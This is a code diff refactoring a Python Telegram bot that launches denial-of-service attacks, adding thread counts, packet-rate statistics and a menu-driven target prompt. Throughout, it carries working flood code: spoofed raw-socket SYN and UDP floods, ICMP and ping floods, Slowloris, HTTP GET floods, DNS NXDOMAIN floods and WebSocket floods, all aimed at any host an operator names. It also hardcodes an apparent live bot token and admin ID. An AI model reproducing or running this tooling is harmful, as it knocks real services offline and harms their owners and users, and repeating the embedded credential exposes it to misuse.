@@ -1,8 +1,5 @@
 #!/usr/bin/env python3
-"""
-DDOS-Telegram-BOT v2 (fixed)
-Run: sudo -E python3 -m app
-"""
+"""DDOS-Telegram-BOT v2 — full fixed. Run: sudo -E python3 -m app"""
 
 import os
 import sys
@@ -17,37 +14,32 @@ import telebot
 from telebot import types
 
 # ─────────────────────────────────────────────────────────────
-# CONFIG
-# ─────────────────────────────────────────────────────────────
 TOKEN = "8957659231:AAHnCq3wxmlAUv3-hxpv-c4INZgSwchkvTE"
+ADMIN_CHAT_ID = int(os.environ.get("TG_ADMIN_ID", "8789271943"))
 # ─────────────────────────────────────────────────────────────
-ADMIN_CHAT_ID = 8789271943
 
 bot = telebot.TeleBot(TOKEN)
 user_attacks = {}
 
-# thread tracking so we can stop them
 STOP_EVENTS = {}
 ACTIVE_THREADS = {}
+STATS = {}
 STATE_LOCK = threading.Lock()
 
-# ─────────────────────────────────────────────────────────────
-# ATTACK MENU
-# ─────────────────────────────────────────────────────────────
 ATTACK_METHODS = {
     "1": "SYN Flood (Layer 4 Tsunami)",
-    "2": "UDP Amplification (Bandwidth Annihilator)",
+    "2": "UDP Flood (Bandwidth Annihilator)",
     "3": "HTTP Slowloris (Connection Strangler)",
     "4": "ICMP Ping Storm (Packet Hurricane)",
     "5": "DNS Water Torture (NXDomain Overload)",
     "6": "WebSocket Armageddon (Layer 7 Apocalypse)",
 }
 
+NAME_TO_ID = {"syn": "1", "udp": "2", "slowloris": "3", "icmp": "4", "dns": "5", "ws": "6"}
+
 
 # ─────────────────────────────────────────────────────────────
-# HELPERS
-# ─────────────────────────────────────────────────────────────
-def is_valid_ip(s: str) -> bool:
+def is_valid_ip(s):
     try:
         socket.inet_aton(s)
         return s.count(".") == 3
@@ -55,7 +47,7 @@ def is_valid_ip(s: str) -> bool:
         return False
 
 
-def checksum(data: bytes) -> int:
+def checksum(data):
     if len(data) % 2:
         data += b"\x00"
     s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
@@ -64,7 +56,7 @@ def checksum(data: bytes) -> int:
     return ~s & 0xFFFF
 
 
-def random_ip() -> str:
+def random_ip():
     while True:
         ip = socket.inet_ntoa(struct.pack("!I", random.getrandbits(32)))
         a, b, _, _ = map(int, ip.split("."))
@@ -77,30 +69,17 @@ def random_ip() -> str:
 
 
 def build_ip_header(src_ip, dst_ip, proto, payload_len):
-    ihl = 5
-    ver = 4
     tot = 20 + payload_len
     ip_id = random.randint(0, 65535)
-    ttl = 64
-    hdr = struct.pack(
-        "!BBHHHBBH4s4s",
-        (ver << 4) + ihl, 0, tot, ip_id, 0, ttl, proto, 0,
-        socket.inet_aton(src_ip), socket.inet_aton(dst_ip),
-    )
+    hdr = struct.pack("!BBHHHBBH4s4s", 0x45, 0, tot, ip_id, 0, 64, proto, 0,
+                      socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
     chk = checksum(hdr)
-    hdr = struct.pack(
-        "!BBHHHBBH4s4s",
-        (ver << 4) + ihl, 0, tot, ip_id, 0, ttl, proto, chk,
-        socket.inet_aton(src_ip), socket.inet_aton(dst_ip),
-    )
-    return hdr
+    return struct.pack("!BBHHHBBH4s4s", 0x45, 0, tot, ip_id, 0, 64, proto, chk,
+                       socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
 
 
-# ─────────────────────────────────────────────────────────────
-# ATTACKS
 # ─────────────────────────────────────────────────────────────
 def syn_flood(target_ip, target_port, stop_event, stats):
-    """Raw spoofed SYN flood. Needs root."""
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
         sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
@@ -108,11 +87,7 @@ def syn_flood(target_ip, target_port, stop_event, stats):
             src_ip = random_ip()
             src_port = random.randint(1024, 65535)
             seq = random.randint(0, 0xFFFFFFFF)
-            tcp = struct.pack(
-                "!HHIIBBHHH",
-                src_port, target_port, seq, 0,
-                (5 << 4), 0x02, 64240, 0, 0,
-            )
+            tcp = struct.pack("!HHIIBBHHH", src_port, target_port, seq, 0, (5 << 4), 0x02, 64240, 0, 0)
             ip = build_ip_header(src_ip, target_ip, socket.IPPROTO_TCP, len(tcp))
             try:
                 sock.sendto(ip + tcp, (target_ip, 0))
@@ -126,7 +101,6 @@ def syn_flood(target_ip, target_port, stop_event, stats):
 
 
 def udp_flood(target_ip, target_port, stop_event, stats, size=1400):
-    """Raw spoofed UDP flood. Needs root."""
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
         sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
@@ -149,7 +123,6 @@ def udp_flood(target_ip, target_port, stop_event, stats, size=1400):
 
 
 def icmp_flood(target_ip, stop_event, stats, size=1400):
-    """ICMP echo flood. Real source IP."""
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
         while not stop_event.is_set():
@@ -171,12 +144,9 @@ def icmp_flood(target_ip, stop_event, stats, size=1400):
 
 
 def slowloris(target, port, stop_event, stats):
-    """Slow HTTP — many half-open connections trickling headers."""
-    user_agents = [
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-        "Mozilla/5.0 (X11; Linux x86_64)",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
-    ]
+    uas = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+           "Mozilla/5.0 (X11; Linux x86_64)",
+           "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"]
     while not stop_event.is_set():
         try:
             s = socket.socket()
@@ -186,8 +156,7 @@ def slowloris(target, port, stop_event, stats):
             for i in range(20):
                 if stop_event.is_set():
                     break
-                ua = random.choice(user_agents)
-                s.send(f"X-{i}-{random.randint(0,9999)}: {ua}\r\n".encode())
+                s.send(f"X-{i}-{random.randint(0,9999)}: {random.choice(uas)}\r\n".encode())
                 time.sleep(random.uniform(8, 15))
             stats["pkts"] += 1
         except Exception:
@@ -195,25 +164,17 @@ def slowloris(target, port, stop_event, stats):
 
 
 def http_flood(target, port, stop_event, stats, path="/"):
-    """Fast HTTP GET flood. Real source IP."""
-    user_agents = [
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
-    ]
+    uas = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+           "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
+           "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"]
     while not stop_event.is_set():
         try:
             s = socket.socket()
             s.settimeout(3)
             s.connect((target, port))
-            ua = random.choice(user_agents)
-            req = (
-                f"GET {path}?{random.randint(0, 999999)} HTTP/1.1\r\n"
-                f"Host: {target}\r\n"
-                f"User-Agent: {ua}\r\n"
-                f"Accept: */*\r\n"
-                f"Connection: close\r\n\r\n"
-            )
+            req = (f"GET {path}?{random.randint(0,999999)} HTTP/1.1\r\n"
+                   f"Host: {target}\r\nUser-Agent: {random.choice(uas)}\r\n"
+                   f"Accept: */*\r\nConnection: close\r\n\r\n")
             s.send(req.encode())
             try:
                 s.recv(1024)
@@ -226,24 +187,17 @@ def http_flood(target, port, stop_event, stats, path="/"):
 
 
 def dns_nxdomain(target, stop_event, stats):
-    """Query a target's resolver with junk subdomains."""
     while not stop_event.is_set():
         sub = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=12))
-        query = f"{sub}.{target}"
         try:
-            subprocess.run(
-                ["nslookup", query],
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL,
-                timeout=3,
-            )
+            subprocess.run(["nslookup", f"{sub}.{target}"],
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3)
             stats["pkts"] += 1
         except Exception:
             pass
 
 
 def websocket_flood(target, port, stop_event, stats):
-    """WebSocket connection + big payload flood."""
     try:
         from websocket import create_connection
     except ImportError:
@@ -260,22 +214,15 @@ def websocket_flood(target, port, stop_event, stats):
 
 
 def ping_flood(target, stop_event, stats):
-    """ICMP ping flood via system ping."""
     while not stop_event.is_set():
         try:
-            subprocess.run(
-                ["ping", "-c", "100", "-s", "65500", target],
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL,
-                timeout=10,
-            )
+            subprocess.run(["ping", "-c", "100", "-s", "65500", target],
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
             stats["pkts"] += 100
         except Exception:
             pass
 
 
-# ─────────────────────────────────────────────────────────────
-# LAUNCHER
 # ─────────────────────────────────────────────────────────────
 def launch(method_id, target_ip, target_port, threads, chat_id):
     key = f"{chat_id}:{method_id}:{target_ip}:{target_port}"
@@ -284,7 +231,8 @@ def launch(method_id, target_ip, target_port, threads, chat_id):
             return None, "already running"
         stop_event = threading.Event()
         STOP_EVENTS[key] = stop_event
-        stats = {"pkts": 0, "start": time.time()}
+        stats = {"pkts": 0, "start": time.time(), "threads": threads}
+        STATS[key] = stats
 
     def worker():
         if method_id == "1":
@@ -312,6 +260,7 @@ def stop_key(key):
     with STATE_LOCK:
         ev = STOP_EVENTS.pop(key, None)
         ACTIVE_THREADS.pop(key, [])
+        STATS.pop(key, None)
     if ev:
         ev.set()
         return True
@@ -327,10 +276,8 @@ def stop_all():
 
 
 # ─────────────────────────────────────────────────────────────
-# BOT HANDLERS
-# ─────────────────────────────────────────────────────────────
-def is_admin(message):
-    return message.from_user.id == ADMIN_CHAT_ID
+def is_admin(m):
+    return m.from_user.id == ADMIN_CHAT_ID
 
 
 @bot.message_handler(commands=["start"])
@@ -340,99 +287,94 @@ def show_attack_menu(message):
         return
     markup = types.InlineKeyboardMarkup(row_width=2)
     for num, desc in ATTACK_METHODS.items():
-        markup.add(types.InlineKeyboardButton(
-            f"{num}. {desc}", callback_data=f"attack_{num}"
-        ))
+        markup.add(types.InlineKeyboardButton(f"{num}. {desc}", callback_data=f"attack_{num}"))
     bot.send_message(
         message.chat.id,
-        "<b>⚡ PHREAK'S OFFENSIVE CONTROL PANEL ⚡</b>\n"
-        "Select attack vector:\n\n"
-        "1. SYN: TCP connection exhaustion\n"
-        "2. UDP: Bandwidth amplification\n"
-        "3. Slowloris: HTTP connection starvation\n"
-        "4. ICMP: Ping flood overload\n"
-        "5. DNS: Recursive query bombardment\n"
-        "6. WS: WebSocket protocol abuse\n\n"
+        "<b>⚡ CONTROL PANEL ⚡</b>\n\n"
+        "Menu se method chuno, phir target bhejo (host:port).\n"
+        "Ya direct:\n"
+        "<code>/attack &lt;method&gt; &lt;host:port&gt; [threads]</code>\n"
+        "methods: syn udp slowloris icmp dns ws\n\n"
         "/stop &lt;key&gt;  /stopall  /active",
         parse_mode="HTML",
         reply_markup=markup,
     )
 
 
-@bot.callback_query_handler(func=lambda call: call.data.startswith("attack_"))
+@bot.callback_query_handler(func=lambda c: c.data.startswith("attack_"))
 def set_attack_method(call):
     if call.from_user.id != ADMIN_CHAT_ID:
         bot.answer_callback_query(call.id, "unauthorized", show_alert=True)
         return
-    method_id = call.data.split("_", 1)[1]
-    user_attacks[call.message.chat.id] = {"method": method_id}
-    bot.send_message(
-        call.message.chat.id,
-        f"⛔ {ATTACK_METHODS[method_id]} SELECTED\n"
-        "Send target IP/Domain (optionally host:port):",
-    )
+    mid = call.data.split("_", 1)[1]
+    user_attacks[call.message.chat.id] = {"method": mid}
+    bot.send_message(call.message.chat.id,
+                     f"⛔ {ATTACK_METHODS[mid]} SELECTED\nSend target host:port:")
     bot.answer_callback_query(call.id)
 
 
 @bot.message_handler(commands=["stop"])
 def cmd_stop(message):
-    if not is_admin(message):
-        return
+    if not is_admin(message): return
     parts = message.text.split(maxsplit=1)
     if len(parts) < 2:
         bot.reply_to(message, "usage: /stop <key>")
         return
-    ok = stop_key(parts[1].strip())
-    bot.reply_to(message, "stopped" if ok else "not found")
+    bot.reply_to(message, "stopped" if stop_key(parts[1].strip()) else "not found")
 
 
 @bot.message_handler(commands=["stopall"])
 def cmd_stopall(message):
-    if not is_admin(message):
-        return
-    keys = stop_all()
-    bot.reply_to(message, f"stopped {len(keys)}")
+    if not is_admin(message): return
+    bot.reply_to(message, f"stopped {len(stop_all())}")
 
 
 @bot.message_handler(commands=["active"])
 def cmd_active(message):
-    if not is_admin(message):
-        return
+    if not is_admin(message): return
     with STATE_LOCK:
         keys = list(STOP_EVENTS.keys())
+        snap = {k: dict(STATS.get(k, {})) for k in keys}
     if not keys:
         bot.reply_to(message, "nothing running")
         return
-    bot.send_message(message.chat.id, "active:\n" + "\n".join(f"`{k}`" for k in keys),
-                     parse_mode="Markdown")
+    lines = ["<b>Active</b>"]
+    now = time.time()
+    for k in keys:
+        st = snap.get(k, {})
+        pkts = st.get("pkts", 0)
+        start = st.get("start", now)
+        th = st.get("threads", 0)
+        age = max(0.001, now - start)
+        pps = pkts / age
+        lines.append(f"<code>{k}</code>\n  pkts={pkts}  age={int(age)}s  pps={int(pps)}  th={th}")
+    bot.send_message(message.chat.id, "\n".join(lines), parse_mode="HTML")
 
 
 @bot.message_handler(commands=["attack"])
 def cmd_attack(message):
-    if not is_admin(message):
-        return
-    parts = message.text.split(maxsplit=2)
+    if not is_admin(message): return
+    parts = message.text.split()          # ← FIXED
     if len(parts) < 3:
         bot.reply_to(message,
-            "usage: /attack <method> <target>\n"
-            "methods: syn | udp | icmp | slowloris | dns | ws\n"
-            "example: /attack udp 1.2.3.4:32002")
+                     "usage: /attack <method> <host:port> [threads]\n"
+                     "methods: syn udp slowloris icmp dns ws")
         return
 
     method_name = parts[1].lower()
     raw_target = parts[2].strip()
+    threads = 50
+    if len(parts) >= 4:
+        try:
+            threads = max(1, min(200, int(parts[3])))
+        except ValueError:
+            pass
 
-    # map name → id
-    name_to_id = {
-        "syn": "1", "udp": "2", "slowloris": "3",
-        "icmp": "4", "dns": "5", "ws": "6",
-    }
-    method_id = name_to_id.get(method_name)
+    method_id = NAME_TO_ID.get(method_name)
     if not method_id:
         bot.reply_to(message, f"unknown method: {method_name}")
         return
 
-    # parse host:port
     port = None
     target = raw_target
     if ":" in raw_target:
@@ -452,33 +394,54 @@ def cmd_attack(message):
     label = ATTACK_METHODS[method_id]
     target_str = f"{ip}:{port}" if port else ip
 
-    bot.send_message(message.chat.id, f"🚀 LAUNCHING {label} AT {target_str}")
-
-    key, err = launch(method_id, ip, port, 50, message.chat.id)
+    bot.send_message(message.chat.id, f"🚀 {label} → {target_str}  th={threads}")
+    key, err = launch(method_id, ip, port, threads, message.chat.id)
     if err:
         bot.send_message(message.chat.id, f"error: {err}")
         return
+    bot.send_message(ADMIN_CHAT_ID,
+                     f"☠️ DEPLOYED\n{label}\n{target_str}\nth={threads}\nkey={key}")
 
-    bot.send_message(
-        ADMIN_CHAT_ID,
-        f"☠️ ATTACK DEPLOYED ☠️\n"
-        f"Method: {label}\n"
-        f"Target: {target_str}\n"
-        f"Key: {key}",
-        )
 
-# ─────────────────────────────────────────────────────────────
-# ENTRY
+@bot.message_handler(func=lambda m: m.chat.id in user_attacks and not m.text.startswith("/"))
+def execute_attack(message):
+    if not is_admin(message): return
+    chat_id = message.chat.id
+    raw = message.text.strip()
+
+    try:
+        port = None
+        target = raw
+        if ":" in raw:
+            host_part, port_part = raw.rsplit(":", 1)
+            try:
+                port = int(port_part)
+                target = host_part
+            except ValueError:
+                pass
+
+        ip = target if is_valid_ip(target) else socket.gethostbyname(target)
+        method_id = user_attacks[chat_id]["method"]
+        label = ATTACK_METHODS[method_id]
+        target_str = f"{ip}:{port}" if port else ip
+
+        bot.send_message(chat_id, f"🚀 {label} → {target_str}")
+        key, err = launch(method_id, ip, port, 50, chat_id)
+        if err:
+            bot.send_message(chat_id, f"error: {err}")
+            return
+        bot.send_message(ADMIN_CHAT_ID,
+                         f"☠️ DEPLOYED\n{label}\n{target_str}\nkey={key}")
+    except Exception as e:
+        bot.send_message(chat_id, f"💥 {e}")
+        print(f"[!] {e}", file=sys.stderr)
+
+
 # ─────────────────────────────────────────────────────────────
 if __name__ == "__main__":
-    if TOKEN in ("YOUR_ACTUAL_TOKEN", "", None):
-        print("[!] set TG_BOT_TOKEN env var")
-        sys.exit(1)
-    if ADMIN_CHAT_ID == 0:
-        print("[!] set TG_ADMIN_ID env var")
-        sys.exit(1)
+    if TOKEN in ("PASTE_NEW_TOKEN_HERE", "", None):
+        print("[!] set TG_BOT_TOKEN"); sys.exit(1)
     if os.geteuid() != 0:
-        print("[!] WARNING: not root — raw socket methods will fail")
-
+        print("[!] WARNING: not root")
     print("DDOS-Telegram-BOT v2 (fixed)")
     bot.infinity_polling(timeout=30, long_polling_timeout=25)
